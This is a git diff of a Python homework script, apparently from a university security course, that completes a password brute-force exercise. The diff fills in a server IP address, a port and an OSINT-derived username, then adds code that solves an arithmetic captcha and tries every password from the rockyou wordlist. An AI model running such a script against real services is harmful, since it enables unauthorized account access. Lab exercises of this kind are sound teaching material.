@@ -25,12 +25,14 @@
 """
 
 import socket
+import re
+import string
+import time
+host = "157.230.179.99" # IP address here
+port = 1337 # Port here
+wordlist = "C:/Users/Lesser Evan/Documents/Notes/Comp Sci Notes/CMSC389R Notes/389Rfall2019/week/2/rockyou.txt" # Point to wordlist file
 
-host = "" # IP address here
-port = 0000 # Port here
-wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
-
-def brute_force():
+def brute_force(x):
     """
         Sockets: https://docs.python.org/2/library/socket.html
         How to use the socket s:
@@ -54,12 +56,43 @@ def brute_force():
             through each possible password and repeatedly attempt to login to
             v0idcache's server.
     """
-
-    username = ""   # Hint: use OSINT
-    password = ""   # Hint: use wordlist
-
-
-
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+    time.sleep(2)
+    data = s.recv(2048)     # Receives 1024 bytes from IP/Port
+    print(data)             # Prints data
+    data = data.decode("utf-8")    
+    print(data)
+    captcha = re.search(r"(\d+) ([\*+\-\/]) (\d+) = \?$", data) 
+    print(captcha)
+    captch = "\n"
+    a = int(captcha.group(1))
+    operand = captcha.group(2)
+    b = int(captcha.group(3))
+    result = 0
+    if operand=="+":
+        result = a+b
+    elif operand=="*":
+        result = a*b
+    elif operand=="/":
+        result = a/b
+    else:
+        result = a-b
+    captch = str(result)+"\n"
+    s.send(captch.encode())
+    data = s.recv(1024)     # Receives 1024 bytes from IP/Port 
+    username = "ejnorman84\n"   # Hint: use OSINT
+    s.send(username.encode())
+    data = s.recv(1024)
+    print(x)
+    s.send(x.encode())
+    time.sleep(1)
+    data = s.recv(1024)
+    print(data)
+    s.close()
 
 if __name__ == '__main__':
-    brute_force()
+    rockyou = open("rockyou.txt")
+    for line in rockyou:
+        brute_force(line)
+    rockyou.close()
